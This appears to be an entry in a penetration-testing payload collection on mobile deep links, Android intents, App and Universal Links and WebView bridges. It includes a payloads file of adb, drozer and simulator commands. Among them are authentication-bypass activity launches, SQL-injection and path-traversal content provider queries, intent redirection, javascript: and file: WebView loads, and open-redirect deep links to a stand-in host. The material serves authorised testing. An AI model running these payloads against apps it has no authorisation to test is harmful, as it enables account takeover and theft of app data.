readme.title: Mobile Deep Links, App Links and WebView Bridges

blocks.text: Mobile apps expose entry points through custom URL schemes, Android intent filters, App Links and Universal Links, and they embed WebViews that can reach native code through JavaScript bridges. If these entry points trust their input, an attacker can open internal screens, bypass authentication, steal OAuth codes, load attacker content in a privileged WebView or trigger native actions. This category lists URL and intent patterns for authorised testing of apps you own or are in scope for.

items: Custom scheme handlers (`myapp://`) that accept unvalidated parameters and URLs
Android exported activities, services and broadcast receivers
Intent redirection and implicit intent hijacking
Unverified App Links (`assetlinks.json`) and Universal Links (`apple-app-site-association`)
OAuth redirect URIs that use a hijackable custom scheme
WebViews with `setJavaScriptEnabled`, `addJavascriptInterface`, file access and loadable `javascript:` or `file:` URLs
Deep links that load a URL into a WebView without allow-listing the host
Push notification and QR code payloads handled as deep links

blocks.text: Extract manifests and URL-scheme registrations (`AndroidManifest.xml`, `Info.plist`), list exported components, then send each deep link with benign values from a test device or emulator. Look for screens that skip authentication, URL parameters loaded into a WebView, and tokens placed in URLs. Verify App Link association files on the web domain. Use `adb` and a proxy against your own build; do not test other users' devices.
See `mobile-deeplinks-payloads.txt` for `adb` and URL patterns. Replace package names, schemes and hosts with the target's.

files.content: # Mobile Deep Link, Intent and WebView Payloads # Replace com.example.app, myapp:// and hosts with those of your authorised target and test device. # Android: enumerate exported components and URL handlers aapt dump badging app.apk apktool d app.apk adb shell dumpsys package com.example.app | grep -iE "scheme|host|path|exported" adb shell pm dump com.example.app | grep -A2 -i "intent-filter" drozer console connect run app.package.attacksurface com.example.app run app.activity.info -a com.example.app run app.activity.start --component com.example.app com.example.app.AdminActivity # Android: send a deep link adb shell am start -a android.intent.action.VIEW -d "myapp://open?screen=settings" adb shell am start -a android.intent.action.VIEW -d "myapp://login?token=test-token-marker" adb shell am start -a android.intent.action.VIEW -d "https://app.example.test/deeplink?screen=admin" adb shell am start -W -a android.intent.action.VIEW -d "myapp://open?url=https://oast.example.test/deeplink" com.example.app # Android: start an exported activity directly (authentication bypass check) adb shell am start -n com.example.app/.AdminActivity adb shell am start -n com.example.app/.SettingsActivity --es "token" "test-token-marker" adb shell am start -n com.example.app/.WebViewActivity --es "url" "https://oast.example.test/wv" adb shell am start -n com.example.app/.WebViewActivity --es "url" "javascript:document.title='wv-marker'" adb shell am start -n com.example.app/.WebViewActivity --es "url" "file:///data/data/com.example.app/shared_prefs/" adb shell am start -n com.example.app/.WebViewActivity -d "content://com.example.app.provider/files/test.html" adb shell am start -a android.intent.action.SEND --es android.intent.extra.TEXT "intent-marker" -n com.example.app/.ShareActivity # Android: broadcast receivers and services adb shell am broadcast -a com.example.app.ACTION_TEST --es "data" "broadcast-marker" adb shell am broadcast -n com.example.app/.TestReceiver --es "cmd" "marker" adb shell am startservice -n com.example.app/.TestService --es "action" "marker" adb shell am start-foreground-service -n com.example.app/.TestService # Android: content providers (read-only checks on your own test data) adb shell content query --uri content://com.example.app.provider/ adb shell content query --uri content://com.example.app.provider/users adb shell content query --uri "content://com.example.app.provider/users" --where "id=1" adb shell content query --uri "content://com.example.app.provider/users" --where "id='1' OR '1'='1'" adb shell content read --uri content://com.example.app.provider/files/../../../shared_prefs/prefs.xml # Android: intent redirection (a component that forwards a nested Intent extra) adb shell am start -n com.example.app/.RedirectActivity --es "next" "intent:#Intent;component=com.example.app/.AdminActivity;end" intent://open#Intent;scheme=myapp;package=com.example.app;S.url=https://oast.example.test/;end intent:#Intent;action=android.intent.action.VIEW;data=https://oast.example.test/;end # Android: browser-launched intents (browsable activities) open app open app custom scheme link # Android: JavaScript bridge probes inside an app WebView (run in the page loaded in the app) # Android: WebView file access (file:// handling) file:///etc/hosts file:///data/data/com.example.app/shared_prefs/prefs.xml file:///android_asset/index.html file:///sdcard/Download/test.html content://com.example.app.provider/files/test.html # Android: App Links verification curl -s https://app.example.test/.well-known/assetlinks.json adb shell pm get-app-links com.example.app adb shell pm verify-app-links --re-verify com.example.app # Look for: missing file, wrong package or fingerprint, wildcard hosts, android:autoVerify missing # Android: backup and debug flags in the manifest android:allowBackup="true" android:debuggable="true" android:exported="true" android:usesCleartextTraffic="true" android:networkSecurityConfig # iOS: URL schemes and Universal Links xcrun simctl openurl booted "myapp://open?screen=settings" xcrun simctl openurl booted "myapp://login?token=test-token-marker" xcrun simctl openurl booted "myapp://open?url=https://oast.example.test/deeplink" xcrun simctl openurl booted "https://app.example.test/deeplink?screen=admin" curl -s https://app.example.test/.well-known/apple-app-site-association curl -s https://app.example.test/apple-app-site-association plutil -p Info.plist | grep -A5 CFBundleURLTypes plutil -p Info.plist | grep -A3 LSApplicationQueriesSchemes # Look for: unverified paths, wildcard components, apps registering the same scheme # iOS: WebView bridge and message handler probes # OAuth with a custom scheme redirect (a second app can register the same scheme on the device) myapp://oauth/callback?code=AUTH_CODE_MARKER&state=STATE com.example.app:/oauth2redirect?code=AUTH_CODE_MARKER # Prefer claimed HTTPS App Links / Universal Links with PKCE for redirects # Parameter injection in deep link values myapp://open?screen=../admin myapp://open?screen=admin myapp://open?url=javascript:document.title='deeplink-marker' myapp://open?url=//oast.example.test myapp://open?url=https://oast.example.test@app.example.test myapp://open?redirect=https://oast.example.test myapp://webview?url=https://oast.example.test myapp://settings?token= myapp://reset?token=TEST_TOKEN_MARKER&email=tester@oast.example.test myapp://pay?amount=0&to=test-account myapp://account?action=noop-marker&confirm=1 myapp://open?id=1&id=2 # QR code and push notification payloads (encode these strings into a QR image or notification data on a test device) myapp://open?screen=settings https://app.example.test/deeplink?screen=admin {"aps":{"alert":"push-marker"},"deeplink":"myapp://open?screen=settings"} {"to":"","data":{"url":"myapp://open?url=https://oast.example.test/"}} # Dynamic analysis helpers (own build) frida -U -f com.example.app -l hook.js objection -g com.example.app explore adb logcat | grep -i com.example.app mitmproxy --mode regular
